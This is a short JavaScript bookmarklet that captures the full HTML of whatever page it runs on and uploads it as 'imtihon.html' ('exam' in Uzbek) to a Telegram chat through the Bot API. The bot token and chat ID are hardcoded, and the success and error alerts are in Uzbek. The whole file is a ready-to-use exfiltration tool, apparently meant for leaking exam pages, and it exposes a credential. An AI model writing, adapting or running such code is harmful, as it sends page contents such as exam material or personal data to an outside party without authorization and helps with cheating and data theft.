javascript:(function(){
  const BOT_TOKEN = '7905303120:AAFTHbtz_lDy4M4KxurDK0xKH63y7flT6VI';
  const CHAT_ID = '5513237031';

  const html = document.documentElement.outerHTML;
  const blob = new Blob([html], { type: 'text/html' });

  const formData = new FormData();
  formData.append('chat_id', CHAT_ID);
  formData.append('document', blob, 'imtihon.html');
  formData.append('caption', 'Salom');

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
    method: 'POST',
    body: formData
  })
  .then(() => alert('Botga yuborildi! ✅'))
  .catch(() => alert('Xato! ❌'));
})();
